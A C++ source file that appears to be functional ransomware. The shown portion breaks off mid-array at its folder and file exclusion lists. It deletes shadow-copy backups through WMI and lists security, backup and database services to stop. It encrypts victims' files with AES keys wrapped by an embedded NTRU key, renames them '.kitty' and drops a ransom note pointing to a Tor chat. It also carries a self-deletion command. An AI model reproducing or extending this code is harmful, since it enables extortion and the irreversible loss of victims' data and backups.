#include <windows.h>
#include <shlwapi.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <winhttp.h>
#include <intrin.h>
#include <comdef.h> 
#include <Wbemidl.h> 
#include <string>
#include <vector>


#include "config.h"
#include "Base64.h"

#include "randomMbedTls.hpp"

#include "..\enc-struct.h"
#include "..\processnames.h"

#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Wbemuuid.lib")
#pragma comment(lib, "Mpr.lib")
#pragma comment(lib, "Iphlpapi.lib")


#define _FILES_OPENED_MAX_COUNT_ 200
#define _SKIP_FILE_SIZE_	(1024 * 1024)



#include "aesMbedTls.hpp"


#include "ntru.hpp"
#include "..\crc32\crc32.h"
#ifdef _DEBUG
#include "..\new-public-ntru-key-debug.h"
#else
#include "..\new-public-ntru-key-release.h"
//#include "..\new-public-ntru-key-debug.h"
#endif



#define CONFIG_SIGNATURE	0xAAEECCD0



#pragma pack(push, 1)
typedef struct _config_params {
	DWORD configSignature;

	ULONGLONG blockSize;
	ULONGLONG limitFileSizeEncrypt;

	bool bCalculateCrc32;
	bool bFullFileEncrypt;
	bool bEncryptFileBlocks;
} config_params;
#pragma pack(pop)


config_params default_parameters = {
	CONFIG_SIGNATURE,
	DEFAULT_BLOCK_SIZE,
	0,
	true,
	false,
	true,
};


//
// it's okay, it used in Encrypt function, do not change anything
NTrueDrbg g_drbg;


std::wstring wNoteString;
void makeNote(LPCWSTR notePath) 
{
	DWORD dwWritten;
	HANDLE fileHandle = CreateFileW(notePath, GENERIC_WRITE, 0, nullptr, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (fileHandle == INVALID_HANDLE_VALUE) {
		if (GetLastError() != ERROR_FILE_EXISTS)
			dbg(LEVEL1, "Note create failed %S, error=%u", notePath, GetLastError());
		return;
	}

	WriteFile(fileHandle, wNoteString.c_str(), (wNoteString.length() * 2), &dwWritten, nullptr);
	CloseHandle(fileHandle);
}



void DowngradeThreadTokenForThreadHandle(PHANDLE hThread)
{
	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		return;
	}

	union {
		TOKEN_ELEVATION_TYPE tet;
		TOKEN_LINKED_TOKEN tlt;
	};

	ULONG rcb;
	if (!GetTokenInformation(hToken, TokenElevationType, &tet, sizeof(tet), &rcb)) {
		CloseHandle(hToken);
		return;
	}

	if (tet == TokenElevationTypeFull)
	{
		if (GetTokenInformation(hToken, TokenLinkedToken, &tlt, sizeof(tlt), &rcb))
		{
			SetThreadToken(hThread, tlt.LinkedToken);
			CloseHandle(tlt.LinkedToken);
		}
	}

	CloseHandle(hToken);
}



BOOL IsWow64()
{
	BOOL bIsWow64 = 0;
	using LPFN_ISWOW64PROCESS = BOOL(WINAPI*) (HANDLE, PBOOL);
	LPFN_ISWOW64PROCESS fnIsWow64Process;
	fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleA("kernel32.dll"), "IsWow64Process");

	if (nullptr != fnIsWow64Process)
	{
		if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
		{
			bIsWow64 = 0;
		}
	}
	return bIsWow64;
}

void removeShadows()
{
	IWbemContext *lpContext;
	HRESULT hr = CoCreateInstance(CLSID_WbemContext, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&lpContext);

	if (SUCCEEDED(hr))
	{
#ifdef _X86_
		if (IsWow64())
		{
			VARIANT vArch;
			VariantInit(&vArch);

			vArch.vt = VT_I4;
			vArch.lVal = 64;

			lpContext->SetValue(L"__ProviderArchitecture", 0, &vArch);
			VariantClear(&vArch);
		}
#endif
		IWbemLocator *lpLocator;
		if ((SUCCEEDED(CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER | CLSCTX_NO_FAILURE_LOG | CLSCTX_NO_CODE_DOWNLOAD, IID_IWbemLocator, (LPVOID*)&lpLocator))) && (lpLocator))
		{
			IWbemServices *lpService;
			BSTR bstrRootPath = SysAllocString(L"ROOT\\cimv2");
			if ((SUCCEEDED(lpLocator->ConnectServer(bstrRootPath, nullptr, nullptr, nullptr, NULL, nullptr, lpContext, &lpService))) && (lpService))
			{
				if (SUCCEEDED(CoSetProxyBlanket(lpService, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE)))
				{
					IEnumWbemClassObject *lpEnumerator = nullptr;
					BSTR bstrWql = SysAllocString(L"WQL");
					BSTR bstrQuery = SysAllocString(L"select * from Win32_ShadowCopy");
					if (SUCCEEDED(lpService->ExecQuery(bstrWql, bstrQuery , WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &lpEnumerator)))
					{
						while (true)
						{
							VARIANT vtProp;
							IWbemClassObject *pclsObj;
							ULONG uReturn = 0;
							lpEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
							if (!uReturn)
								break;

							if ((SUCCEEDED(pclsObj->Get(L"id", 0, &vtProp, nullptr, nullptr))) && (vtProp.vt == VT_BSTR))
							{
								wchar_t lpStr[128];
								wsprintfW(lpStr, L"Win32_ShadowCopy.ID='%s'", vtProp.bstrVal);
								if (BSTR str = SysAllocString(lpStr)) {
									lpService->DeleteInstance(str, 0, lpContext, nullptr);
									SysFreeString(str);
								}
								VariantClear(&vtProp);
							}
							pclsObj->Release();
							VariantClear(&vtProp);
						}
					}
					SysFreeString(bstrWql);
					SysFreeString(bstrQuery);
				}
				SysFreeString(bstrRootPath);
				lpService->Release();
			}
			lpLocator->Release();
		}
		lpContext->Release();
	}
}

/*
LPWSTR lpwTaskkill[] = {
L"mysql*",
L"dsa*",
L"Ntrtscan*",
L"ds_monitor*",
L"Notifier*",
L"TmListen*",
L"iVPAgent*",
L"CNTAoSMgr*",
L"IBM*",
L"bes10*",
L"black*",
L"robo*",
L"copy*",
L"store.exe",
L"sql*",
L"vee*",
L"wrsa*",
L"wrsa.exe",
L"postg*",
L"sage*",
};

LPWSTR lpwNetStop[] = {
L"MSSQLServerADHelper100",
L"MSSQL$ISARS",
L"MSSQL$MSFW",
L"SQLAgent$ISARS",
L"SQLAgent$MSFW",
L"SQLBrowser",
L"ReportServer$ISARS",
L"SQLWriter",
L"WinDefend",
L"mr2kserv",
L"MSExchangeADTopology",
L"MSExchangeFBA",
L"MSExchangeIS",
L"MSExchangeSA",
L"ShadowProtectSvc",
L"SPAdminV4",
L"SPTimerV4",
L"SPTraceV4",
L"SPUserCodeV4",
L"SPWriterV4",
L"SPSearch4",
L"MSSQLServerADHelper100",
L"IISADMIN",
L"firebirdguardiandefaultinstance",
L"ibmiasrw",
L"QBCFMonitorService",
L"QBVSS",
L"QBPOSDBServiceV12",
L"IBM Domino Server(CProgramFilesIBMDominodata)",
L"IBM Domino Diagnostics(CProgramFilesIBMDomino)",
L"IISADMIN",
L"Simply Accounting Database Connection Manager",
L"QuickBooksDB1",
L"QuickBooksDB2",
L"QuickBooksDB3",
L"QuickBooksDB4",
L"QuickBooksDB5",
L"QuickBooksDB6",
L"QuickBooksDB7",
L"QuickBooksDB8",
L"QuickBooksDB9",
L"QuickBooksDB10",
L"QuickBooksDB11",
L"QuickBooksDB12",
L"QuickBooksDB13",
L"QuickBooksDB14",
L"QuickBooksDB15",
L"QuickBooksDB16",
L"QuickBooksDB17",
L"QuickBooksDB18",
L"QuickBooksDB19",
L"QuickBooksDB20",
L"QuickBooksDB21",
L"QuickBooksDB22",
L"QuickBooksDB23",
L"QuickBooksDB24",
L"QuickBooksDB25",
};



/*
void TerminateActiveProcessList() {

	WCHAR params[512];

	for (int i = 0; i < ARRAYSIZE(lpwTaskkill); i++) {
		wsprintfW(params, L"/f /im \"%s\"", lpwTaskkill[i]);
		ShellExecuteW(0, L"open", L"taskkill.exe", params, NULL, SW_SHOWNORMAL);
		Sleep(50);
	}

	for (int i = 0; i < ARRAYSIZE(lpwNetStop); i++) {
		wsprintfW(params, L"stop \"%s\"", lpwNetStop[i]);
		ShellExecuteW(0, L"open", L"net.exe", params, NULL, SW_SHOWNORMAL);
		Sleep(50);
	}

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE) {

		PROCESSENTRY32 pe = { 0 };
		pe.dwSize = sizeof(pe);

		if (Process32FirstW(hSnap, &pe)) {
			do {

				for (int i = 0; i < ARRAYSIZE(szwProcessNamesList); i++)
				{
#ifdef _DEBUG
					if (lstrcmpiW(pe.szExeFile, L"calculator.exe") != 0)
						continue;
#endif
					if (StrStrIW(szwProcessNamesList[i], pe.szExeFile) != NULL && pe.th32ProcessID > 1000)
					{
						wsprintfW(params, L"/f /PID \"%u\"", pe.th32ProcessID);
						for (int i = 0; i < 1; i++) {
							ShellExecuteW(0, L"open", L"taskkill.exe", params, nullptr, SW_SHOWNORMAL);
						}
						break;
					}
				}
			} while (Process32Next(hSnap, &pe));

		}
		CloseHandle(hSnap);
	}
}
*/


HANDLE hMutex = nullptr;

bool CreateAndContinue(const wchar_t* _mutexName)
{
	if (hMutex)
		return true;

	hMutex = OpenMutexW(SYNCHRONIZE, FALSE, _mutexName);
	if (hMutex)
	{
		CloseHandle(hMutex);
		return false;
	}

	hMutex = CreateMutexW(nullptr, FALSE, _mutexName);
	if (hMutex == nullptr)
	{
		if (GetLastError() != ERROR_ALREADY_EXISTS)
			return false;
	}

	return true;
}

// void CloseMutex()
// {
// 	CloseHandle(hMutex);
// }
// 
// void StopDoubleProcessRun()
// { 
// 	if (!CreateAndContinue(lpwMutexName))
// 	{
// #ifdef _DEBUG
// 		dbg(LEVEL1, "nono bro double process");
// 		getchar();
// #endif
// 		ExitProcess(0);
// 	}
// }
// 

void GetHex(BYTE* bytes, size_t size, char* output)
{
	char singleHex[32];
	output[0] = 0;

	for (size_t i = 0; i != size; i++)
	{
		wnsprintfA(singleHex, sizeof(singleHex), "%02x", bytes[i] & 0xFF);
		lstrcatA(output, singleHex);
	}
}


extern BYTE public_bytes[256];
LPWSTR lpwAppendText = 
L"\r\n\r\n"
L"-- Contact with us by method below\r\n"
L"1) Open this website in TOR browser: %s/%S\r\n"
L"2) Follow instructions in chat. \r\n";

wchar_t szwOnionSite[1024*2] = L"http://onion.onion";
wchar_t szwStrNoteFormat[1024 * 4] = { L'D', L'E', L'A', L'D', L'T', L'E', L'X', L'T', 0 };

/*
LPCWSTR noteStrFormat = L"Hello dear user.\r\n"
"Your files have been encrypted.\r\n\r\n"
"-- What does it mean?!\r\n"
"Content of your files have been modified. Without special key you can't undo that operation.\r\n\r\n"

"-- How to get special key?\r\n"
"If you want to get it, you must pay us some money and we will help you.\r\n"
"We will give you special decryption program and instructions.\r\n\r\n"
*/



#include "..\sha256\sha256.h"
void getUserNote(std::wstring& result)
{
	BYTE sha256[SHA256_BLOCK_SIZE];
	sha256_hash((char*)ntru_public_bytes, sizeof(ntru_public_bytes), sha256);

	char chatName[256];
	GetHex(sha256, sizeof(sha256), chatName);

	auto appendText = new wchar_t[sizeof(szwStrNoteFormat) * 2];
	auto totalText = new wchar_t[sizeof(szwStrNoteFormat) * 2];
	wsprintfW(appendText, lpwAppendText, szwOnionSite, chatName);
	wsprintfW(totalText, L"%s\r\n%s", szwStrNoteFormat, appendText);
	result = std::wstring(totalText, lstrlenW(totalText));
	delete[] appendText;
	delete[] totalText;
}


void DoIOCP(LPWSTR* lpwParams, int paramsCount);



LONG WINAPI TTOP_LEVEL_EXCEPTION_FILTER(
	__in _EXCEPTION_POINTERS* ExceptionInfo
)
{
	dbg(LEVEL0, "FATAL EXCEPTION !!!");
	ExitProcess(0);
	return EXCEPTION_CONTINUE_EXECUTION;
}


void SelfDelete2() 
{
	WCHAR wMyPath[MAX_PATH * 2];
	GetModuleFileNameW(NULL, wMyPath, ARRAYSIZE(wMyPath));

	WCHAR wMyFileName[MAX_PATH];
	lstrcpyW(wMyFileName, PathFindFileNameW(wMyPath));

	PathRemoveFileSpecW(wMyPath);
	PathAddBackslashW(wMyPath);

	WCHAR wCmd[MAX_PATH];
	wsprintfW(wCmd, L"/C ping 127.0.0.1 & del %s", wMyFileName);
	ShellExecuteW(0, L"open", L"cmd.exe", wCmd, wMyPath, SW_SHOWNORMAL);
}


#if defined(_DEBUG) || defined(_LOG_ENABLED_)
int main()
#else
int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
#endif
{
	//
	dbg(LEVEL0, "COINITIALIZE");
	CoInitialize(NULL);

	//
	dbg(LEVEL0, "SET ERROR MODE");
	SetErrorMode(SEM_FAILCRITICALERRORS);

	//
	// dbg(LEVEL0, "STOP DOUBLE PROCESS RUN");
	// StopDoubleProcessRun();

	//
	getUserNote(wNoteString);

	int numArgs = 0;
	LPWSTR* lpwParams = CommandLineToArgvW(GetCommandLineW(), &numArgs);
	if (!lpwParams)
		return 0;


	SYSTEMTIME st;
	FILETIME TimeEncryptionStarts;
	FILETIME TimeEncryptionEnds;

	GetSystemTime(&st);
	SystemTimeToFileTime(&st, &TimeEncryptionStarts);

	dbg(LEVEL0, "DO IOCP");
	DoIOCP(lpwParams, numArgs);

	GetSystemTime(&st);
	SystemTimeToFileTime(&st, &TimeEncryptionEnds);

	LARGE_INTEGER cstart, cends;
	cstart.HighPart = TimeEncryptionStarts.dwHighDateTime;
	cstart.LowPart = TimeEncryptionStarts.dwLowDateTime;

	cends.HighPart = TimeEncryptionEnds.dwHighDateTime;
	cends.LowPart = TimeEncryptionEnds.dwLowDateTime;

	//
	ULONGLONG ms = (cends.QuadPart - cstart.QuadPart) / 10000;

	dbg(LEVEL0, "Total time of encryption: %llu seconds", ms / 1000)

	dbg(LEVEL0, "Local free");
	LocalFree(lpwParams);

	// SelfDelete2();

	return 0;
}





HANDLE h_Port;

volatile ULONG filesOpened = 0;
volatile ULONG writeSpeed = 0;
volatile ULONG readSpeed = 0;
volatile ULONG totalEncrypted = 0;
volatile ULONG encryptedPerSecond = 0;
volatile ULONGLONG totalSizeOfFiles = 0;
volatile ULONG filesParsedBySearch = 0;

bool g_globalStop = false;
bool g_stopsearch = false;


bool read_next_block(over_struct* o) {
	BOOL res = ReadFile(o->hFile, o->tempbuff, sizeof(o->tempbuff), NULL, (LPOVERLAPPED)o);

	if (res == FALSE && GetLastError() == ERROR_IO_PENDING) {
		return true;
	}

	if (res == TRUE && GetLastError() == 0)
		return true;

	if (res == TRUE) 
	{
		dbg(LEVEL1, "Read file continue...");
		return true;
	}

	if (res == FALSE && GetLastError() == ERROR_HANDLE_EOF) {
		o->operation = operation_write_eof;
		if (!PostQueuedCompletionStatus(h_Port, 0, 0, (LPOVERLAPPED)o)) {
			dbg(LEVEL1, "ERROR: post queued failed %d", GetLastError());
			return false;
		}
		dbg(LEVEL1, "EOF Sent"); 
		return true;
	}


	if (GetLastError() == ERROR_INVALID_USER_BUFFER || GetLastError() == ERROR_NOT_ENOUGH_MEMORY || GetLastError() == ERROR_NOT_ENOUGH_QUOTA) {
		// SetLastError(ERROR_NOT_ENOUGH_MEMORY);
	}

	dbg(LEVEL1, "read_next_block(ReadFile) %u", GetLastError());
	return false;
}


bool read_next_block(over_struct* o, LONGLONG offset, int operation = operation_read) {
	LARGE_INTEGER li;
	li.QuadPart = offset;

	o->operation = operation;
	o->overlapped.Offset = li.LowPart;
	o->overlapped.OffsetHigh = li.HighPart;

	return read_next_block(o);
}


/*
	return true if success pushed to iocp queue
	return false and getlasterror = ERROR_NOT_ENOUGH_MEMORY - retry send data
	return false if failed
*/

bool write_block(
	over_struct* o,
	LONGLONG offset, 
	char* buff, DWORD size, 
	int operation_type = operation_write)
{
	LARGE_INTEGER li;
	li.QuadPart = offset;

	o->operation = operation_type;
	o->overlapped.Offset = li.LowPart;
	o->overlapped.OffsetHigh = li.HighPart;

	if (size > sizeof(o->tempbuff)) {
		dbg(LEVEL1, "ERROR: Buffer overflow available size=%u, write size=%u", sizeof(o->tempbuff), size);
		return false;
	}

	memcpy(o->tempbuff, buff, size);

	BOOL res = WriteFile(o->hFile, o->tempbuff, size, NULL, (LPOVERLAPPED)o);

	if (res == FALSE && GetLastError() == ERROR_IO_PENDING) {
		dbg(LEVEL1, "Pending...");
		return true;
	}

	if (res && (GetLastError() == 0)) {
		dbg(LEVEL1, "Success without 'pending'...");
		return true;
	}

	if (res) {
		dbg(LEVEL1, "Write file continue...");
		return true;
	}


	if (GetLastError() == ERROR_INVALID_USER_BUFFER || GetLastError() == ERROR_NOT_ENOUGH_MEMORY || GetLastError() == ERROR_NOT_ENOUGH_QUOTA) {
		// SetLastError(ERROR_NOT_ENOUGH_MEMORY);
	}

	dbg(LEVEL1, "ERROR: write_block(WriteFile) %u", GetLastError());
	return false;
}


LONGLONG OverlappedOffsetToLongLong(OVERLAPPED& ov) {
	LARGE_INTEGER li;
	li.HighPart = ov.OffsetHigh;
	li.LowPart = ov.Offset;
	return li.QuadPart;
}


void close_file(over_struct* s) {
	CancelIo(s->hFile);
	CloseHandle(s->hFile);
	delete ((AES128MbedTls*)s->aes_ctx);
	delete s;
	InterlockedDecrement(&filesOpened);
}



typedef struct _enc_end_of_file_ntru
{
	byte ntru_encrypted[sizeof(ntru_public_bytes)];
	uint16_t cipherLen;
	DWORD dwEncryptedFlag;
} enc_end_of_file_ntru;



DWORD WINAPI ReadWritePoolThread(LPVOID lpParams) {
	DWORD bytes;
	DWORD key;
	over_struct* str;
	BOOL res;

	dbg(LEVEL0, "ReadWritePoolThread(%u) starting...", GetCurrentThreadId());

	while (g_globalStop == false)
	{
		res = GetQueuedCompletionStatus(h_Port, &bytes, &key, (LPOVERLAPPED*)&str, 5000);
		if (res == 0 && GetLastError() == WAIT_TIMEOUT)
			continue;

		if (str) {
			// dbg(LEVEL1, "IO Event %d, result=%d", str->operation, res);
		}

		if (!res && !str) {
			dbg(LEVEL1, "(%u) GetQueuedCompletionStatus() res=0, str=null, err=%u", GetCurrentThreadId(), GetLastError());
		}

		if (!res && str) 
		{
			if (GetLastError() == ERROR_HANDLE_EOF) {
				dbg(LEVEL1, "Processing eof in iocp handler");
				str->operation = operation_write_eof;
				PostQueuedCompletionStatus(h_Port, 0, 0, (LPOVERLAPPED)str);
				continue;
			}

			dbg(LEVEL0, "(%u) ERROR: Unknown unhandled error, closing file.", GetCurrentThreadId());

			close_file(str);
			continue;
		}

		if (res && str) 
		{

			if (str->operation == operation_read_check_encrypted) 
			{
				if (bytes == sizeof(enc_end_of_file_ntru)) {
					enc_end_of_file_ntru* encFile = (enc_end_of_file_ntru*)str->tempbuff;
					if (encFile->dwEncryptedFlag != ENCRYPTED_FILE_FLAG)  {
						if (read_next_block(str, 0)) {
							continue;
						}
					}
				}

				close_file(str);
				continue;
			}
			else if (str->operation == operation_read) 
			{
				InterlockedExchangeAdd(&readSpeed, bytes);

				// read complete
				auto current_block_offset = str->currentBlock * str->encHeader.blockSize;

				//////////////////////////////////////////////////////////////////////////
				ULONGLONG next_block_offset;
				if ((str->encHeader.encType & ENCTYPE_RANDOM_BLOCKS) == ENCTYPE_RANDOM_BLOCKS) {
					str->currentBlock += 1 + Random::Get(str->StepRandSeedRuntime, str->encHeader.StepRandMax);
				}
				else if ((str->encHeader.encType & ENCTYPE_FULL_FILE) == ENCTYPE_FULL_FILE) {
					str->currentBlock += 1;
				}
				next_block_offset = str->currentBlock * str->encHeader.blockSize;
				//////////////////////////////////////////////////////////////////////////

				if (bytes < str->encHeader.blockSize || next_block_offset >= str->fileSize) {
					// write encrypted data and call write eof to file
					if ((str->encHeader.encType & ENCTYPE_USE_CRC32) == ENCTYPE_USE_CRC32) {
						str->encHeader.endBlockCrc32 = xcrc32(str->tempbuff, ALIGNUP(bytes, AES_BLOCKLEN), 0);
					}
				}

				if (bytes < str->encHeader.blockSize) {
					auto alignBytesSize = bytes;
					bytes = ALIGNUP(bytes, AES_BLOCKLEN);
				}

				// AES_CBC_encrypt_buffer(&str->aes, str->tempbuff, bytes / AES_BLOCKLEN);
				if (!((AES128MbedTls*)str->aes_ctx)->Encrypt(str->tempbuff, str->outputbuff, bytes)) {
					dbg(LEVEL0, "ERROR: Failed to encrypt AES block");
				}
				
				// write encrypted data to file
				if (!write_block(str, current_block_offset, (char*)str->outputbuff, bytes, operation_write)) {
					dbg(LEVEL0, "ERROR: Write current block %u", GetLastError());
					close_file(str);
					continue;
				}

				continue;
			}
			else if (str->operation == operation_write) {
				// write complete
				InterlockedExchangeAdd(&writeSpeed, bytes);

				//
				// currentBlock already incremented
				// offsets calculates in operation_read callback
				//
				ULONGLONG next_block_offset = (str->currentBlock) * str->encHeader.blockSize;

				//
				// if this is the last block
				// write end of file
				//
				if ((str->encHeader.encType & ENCTYPE_LIMIT_FILE_SIZE) && next_block_offset >= str->encHeader.qwMaxEnctyptionSize)
				{
					str->operation = operation_write_eof;
					PostQueuedCompletionStatus(h_Port, 0, 0, (LPOVERLAPPED)str);
					continue;
				}

				if (!read_next_block(str, next_block_offset))
				{
					dbg(LEVEL0, "ERROR: read next block %u", GetLastError());
					close_file(str);
					continue;
				}

				// success wait for read complete
				continue;
			}
			else if (str->operation == operation_write_eof) 
			{
				dbg(LEVEL1, "Write eof prepare keys");
				NTRUEncrypt256 ntru256;
				ntru256.SetPublicKey(ntru_public_bytes, sizeof(ntru_public_bytes));

				dbg(LEVEL1, "Prepare header");
				enc_end_of_file_ntru encFileEof = { 0 };
				encFileEof.dwEncryptedFlag = ENCRYPTED_FILE_FLAG;

				dbg(LEVEL1, "Encrypt header");
				uint16_t outputLength = sizeof(encFileEof.ntru_encrypted);

				if (!ntru256.Encrypt(&g_drbg, (uint8_t*)&str->encHeader, sizeof(str->encHeader), (uint8_t*)&encFileEof.ntru_encrypted, &outputLength))
				{
					dbg(LEVEL0, "ERROR: FAILED TO ENCRYPT EOF");
					close_file(str);
					continue;
				}

				dbg(LEVEL1, "Encrypt done");
				// set correct encrypted length
				encFileEof.cipherLen = outputLength;

				dbg(LEVEL1, "Get size");
				LARGE_INTEGER fsize;
				GetFileSizeEx(str->hFile, &fsize);

				dbg(LEVEL1, "Write block");
				if (!write_block(str, fsize.QuadPart, (char*)&encFileEof, sizeof(encFileEof), operation_write_closehandle)) {
					dbg(LEVEL0, "ERROR: Write last block failed %u", GetLastError());
					close_file(str);
					continue;
				}

				dbg(LEVEL1, "Write block end");
				continue;
			}
			else if (str->operation == operation_write_closehandle) 
			{
				dbg(LEVEL1, "Closing handle...");

				// save path coz we need close up file handle first before rename
				std::wstring wPath = std::wstring(str->wFullFilePath);

				dbg(LEVEL1, "Path to file %S", wPath.c_str());

				// str release
				close_file(str);

				dbg(LEVEL1, "Closed...");

				InterlockedIncrement(&encryptedPerSecond);
				InterlockedIncrement(&totalEncrypted);

				std::wstring newPathString = wPath + L".kitty";

				dbg(LEVEL1, "Moving file...");
				if (MoveFile(wPath.c_str(), newPathString.c_str()) == FALSE && GetLastError() == ERROR_ALREADY_EXISTS)
				{
					dbg(LEVEL1, "ERROR: move file failed, already exists %S try do new file name", newPathString.c_str());
					for (int i = 1; i < 200; i++) 
					{
						WCHAR count[64];
						_itow_s(i, count, ARRAYSIZE(count), 10);
						newPathString = wPath + L'(' + count + L").kitty";

						if (MoveFile(wPath.c_str(), newPathString.c_str()))
							break;

						if (GetLastError() != ERROR_ALREADY_EXISTS) {
							dbg(LEVEL1, "ERROR: we could not find corrent new file name for %S", wPath.c_str());
							break;
						}
					}
				}
				dbg(LEVEL1, "Move done");
			}
			else {
				dbg(LEVEL1, "(%u) ERROR: Unknown operation", GetCurrentThreadId());
			}
		}
	}

	dbg(LEVEL1, "ReadWritePoolThread(%u) thread job done", GetCurrentThreadId());

	return 0;
}






#include <RestartManager.h>

typedef DWORD(WINAPI* tRmStartSession)(DWORD* pSessionHandle, DWORD    dwSessionFlags, WCHAR* strSessionKey);
typedef DWORD(WINAPI* tRmRegisterResources)(DWORD dwSessionHandle, UINT nFiles, LPCWSTR* rgsFileNames, UINT nApplications, RM_UNIQUE_PROCESS* rgApplications, UINT nServices, LPCWSTR* rgsServiceNames);
typedef DWORD(WINAPI* tRmGetList)(DWORD dwSessionHandle, UINT* pnProcInfoNeeded, UINT* pnProcInfo, RM_PROCESS_INFO* rgAffectedApps, LPDWORD lpdwRebootReasons);
typedef DWORD(WINAPI* tRmEndSession)(DWORD dwSessionHandle);
typedef DWORD(WINAPI* tRmShutdown)(DWORD dwSessionHandle, ULONG lActionFlags, RM_WRITE_STATUS_CALLBACK fnStatus);

bool FreeFileBusyResources(const wchar_t* PathName)
{
	bool result = false;

	static HMODULE hlib = LoadLibraryW(L"Rstrtmgr.dll");

	if (!hlib)
		return result;

	static tRmStartSession rmStartSession = (tRmStartSession)GetProcAddress(hlib, "RmStartSession");
	static tRmRegisterResources rmRegisterResources = (tRmRegisterResources)GetProcAddress(hlib, "RmRegisterResources");
	static tRmGetList rmGetList = (tRmGetList)GetProcAddress(hlib, "RmGetList");
	static tRmEndSession rmEndSession = (tRmEndSession)GetProcAddress(hlib, "RmEndSession");
	static tRmShutdown rmShutdown = (tRmShutdown)GetProcAddress(hlib, "RmShutdown");

	if (!rmStartSession || !rmRegisterResources || !rmGetList || !rmEndSession || !rmShutdown)
		return result;


	DWORD dwSession = 0x0;
	wchar_t szSessionKey[CCH_RM_SESSION_KEY + 1] = { 0 };
	if (rmStartSession(&dwSession, 0x0, szSessionKey) == ERROR_SUCCESS)
	{
		DWORD err = 0;
		if ((err = rmRegisterResources(dwSession, 1, &PathName, 0, NULL, 0, NULL)) == ERROR_SUCCESS)
		{
			DWORD dwReason = 0x0;
			UINT nProcInfoNeeded = 0;
			UINT nProcInfo = 0;
			if (rmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, NULL, &dwReason) == ERROR_MORE_DATA && nProcInfoNeeded) {
				// file lock check it
				result = (rmShutdown(dwSession, 1, 0) == ERROR_SUCCESS);
			}
		}
		else {
			dbg(LEVEL1, "ERROR: To check file lock %u", err);
		}
		rmEndSession(dwSession);
	}

	return result;
}




void EncryptFileIOCP(const std::wstring & filepath) 
{
	dbg(LEVEL1, "Opening file %S", filepath.c_str());

	HANDLE hFile = CreateFileW(filepath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
	{
		dbg(LEVEL0, "Failed to open file %S, err=%d", filepath.c_str(), GetLastError());

		FreeFileBusyResources(filepath.c_str());

		hFile = CreateFileW(filepath.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
		if (hFile == INVALID_HANDLE_VALUE) {
			dbg(LEVEL1, "ERROR: Failed to open file after release resources %S, error=%u", filepath.c_str(), GetLastError());
			return;
		}
	}

	LARGE_INTEGER li;
	GetFileSizeEx(hFile, &li);

	if (li.QuadPart == 0) {
		dbg(LEVEL0, "File size is zero");
		CloseHandle(hFile);
		return;
	}

	if (li.QuadPart <= _SKIP_FILE_SIZE_) {
		dbg(LEVEL0, "File size is skip");
		CloseHandle(hFile);
		return;
	}

	if (CreateIoCompletionPort(hFile, h_Port, 0, 0) == 0) {
		dbg(LEVEL1, "ERROR: create port failed file %S, error=%u", filepath.c_str(), GetLastError());
		CloseHandle(hFile);
		return;
	}

	auto o = new over_struct();

	o->hFile = hFile;
	o->wFullFilePath = std::wstring(filepath);
	o->fileSize = li.QuadPart;

	o->encHeader.dwMagic = ENCRYPTION_MAGIC;
	o->encHeader.qwOriginalFileSize = li.QuadPart;
	o->encHeader.blockSize = sizeof(o->tempbuff);

	o->encHeader.encType = 0;
	if (default_parameters.bFullFileEncrypt) {
		o->encHeader.encType |= ENCTYPE_FULL_FILE;
	}
	else if (default_parameters.bEncryptFileBlocks) {
		DWORD dwRandSeed = GetTickCount() + (DWORD)__rdtsc();
		o->encHeader.encType |= ENCTYPE_RANDOM_BLOCKS;
		o->encHeader.StepRandSeed = Random::Get(dwRandSeed, 0xFFFFFFFF);
		o->StepRandSeedRuntime = o->encHeader.StepRandSeed;
		o->encHeader.StepRandMax = 5;
	}

	if (default_parameters.bCalculateCrc32) {
		o->encHeader.encType |= ENCTYPE_USE_CRC32;
	}

	if (default_parameters.limitFileSizeEncrypt != 0) {
		o->encHeader.encType |= ENCTYPE_LIMIT_FILE_SIZE;
		o->encHeader.qwMaxEnctyptionSize = default_parameters.limitFileSizeEncrypt;
	}

	o->aes_ctx = new AES128MbedTls();
	((AES128MbedTls*)o->aes_ctx)->GenKeyIv(MBEDTLS_AES_ENCRYPT);
	((AES128MbedTls*)o->aes_ctx)->CopyKeyIv(o->encHeader.aes_key, o->encHeader.aes_iv);

	InterlockedIncrement(&filesOpened);

	if (li.QuadPart < sizeof(enc_end_of_file_ntru)) 
	{
		if (!read_next_block(o, 0)) {
			dbg(LEVEL1, "ERROR: Read first block failed");
			close_file(o);
		}
	}
	else 
	{
		if (!read_next_block(o, li.QuadPart - sizeof(enc_end_of_file_ntru), operation_read_check_encrypted)) {
			dbg(LEVEL1, "ERROR: Read encrypted block fail");
			close_file(o);
		}
	}
}








const wchar_t* blackFolders[] = { 
	L"programdata", L"$recycle.bin", L"program files", L"windows", L"all users", 
	L"winnt", L"appdata", L"application data", L"local settings", L"boot",
};
const wchar_t* blackFiles[] = { 
